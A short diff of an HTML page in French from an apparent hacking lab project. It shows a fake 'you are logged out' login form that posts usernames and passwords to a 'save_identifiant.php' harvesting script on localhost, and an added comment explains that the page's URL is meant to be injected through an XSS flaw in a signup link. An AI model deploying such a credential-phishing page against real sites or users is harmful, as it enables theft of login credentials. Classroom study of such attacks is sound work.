@@ -1,16 +1,17 @@
+<!-- L'url vers cette page doit être inclue dans une l'url d'inscription pour réaliser une faille xss -->
 <h1>Vous êtes déconnecté</h1>
-			<form action="http://localhost/attaque/projetHacking/hack/save_identifiant.php" method="POST" class="form-example">
-				<div class="hand"></div>
-				<div class="hand rgt"></div>
-				<div class="form-group">
-					<label class="form-label">Identifiant    </label>
-					<input type="text" name="username" id="username" required="required" class="form-control" />
-				</div>
-				<div class="form-group">
-					<label class="form-label">Mot de passe</label>
-					<input id="password" name="password" type="password" required="required" class="form-control" />
-				  <br/><br/>
-				  <button class="btn">Connexion ! </button>
-				</div>
-			</form>
-	<br/>
+<form action="http://localhost/attaque/projetHacking/hack/save_identifiant.php" method="POST" class="form-example">
+	<div class="hand"></div>
+	<div class="hand rgt"></div>
+	<div class="form-group">
+		<label class="form-label">Identifiant </label>
+		<input type="text" name="username" id="username" required="required" class="form-control" />
+	</div>
+	<div class="form-group">
+		<label class="form-label">Mot de passe</label>
+		<input id="password" name="password" type="password" required="required" class="form-control" />
+		<br /><br />
+		<button class="btn">Connexion ! </button>
+	</div>
+</form>
+<br />
